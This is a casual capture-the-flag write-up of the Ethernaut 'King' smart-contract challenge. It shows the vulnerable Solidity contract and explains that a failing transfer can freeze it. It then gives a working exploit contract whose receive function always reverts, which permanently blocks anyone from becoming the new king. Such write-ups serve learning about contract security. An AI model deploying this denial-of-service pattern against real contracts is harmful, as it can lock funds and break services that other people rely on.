## King memes

### Contract

<details><summary>CLICK TO VIEW</summary>
<p>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

</p>
</details>

### Solution

I'm not going to lie, the prompt of this specific challenge had be riddled up in all directions. I had no idea what I was trying to achieve. Then,
after a dozen of minutes re-reading, it finally came to my mind I had to exploit the contract to render it as useless; In short, I had to make it fail.

My first instinct was to manipulate it here:

```solidity
    require(msg.value >= prize || msg.sender == owner);
```

I quickly came to realize that line was in fact secure and well made. This wasn't what the challenge was trying to make us exploit; After a dozen of
google searches, I came to realize the following line was vulnerable:

```solidity
    king.transfer(msg.value);
```

If we were to somehow make that transfer fail, we'd make the whole contract go beserk. That's some king shit right there. I ended up writing the following
marvelous piece of junk:

```solidity
contract Exploit {
    address public delegate;

    constructor (address delegate_) public payable {
        delegate = delegate_;
    }

    function exploit(uint gazz) public payable {
        payable(delegate).call.value(address(this).balance)("");
    }

    receive() external payable {
        revert("kekw");
    }
}
```

Because solidity was of version 0.6.0, it took me WAY longer than I'd like to admit to figure out how to invoke the receive function all-the-whilst transfering
enough gas for it to handle properly without issue.

And tada. It workie. We just had to place our bets once, override the king, then the contract would be unable to reclaim his throne. Get rekt
